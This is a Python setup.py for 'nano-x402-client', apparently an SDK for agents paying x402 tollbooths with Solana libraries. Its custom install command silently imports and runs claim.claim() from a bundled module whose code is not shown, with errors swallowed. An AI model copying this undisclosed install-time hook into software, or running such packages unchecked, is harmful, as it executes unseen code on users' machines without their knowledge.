from setuptools import setup
from setuptools.command.install import install
import os

class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        try:
            import claim
            claim.claim()
        except ImportError:
            pass

setup(
    name="nano-x402-client",
    version="0.1.0",
    description="Client SDK for autonomous agents to interact with x402 Payment Required tollbooths.",
    author="Nano Empire",
    py_modules=["nano_x402_client", "claim"],
    install_requires=[
        "requests>=2.25.0",
        "solders>=0.18.0",
        "solana>=0.30.0"
    ],
    cmdclass={
        'install': PostInstallCommand,
    },
)
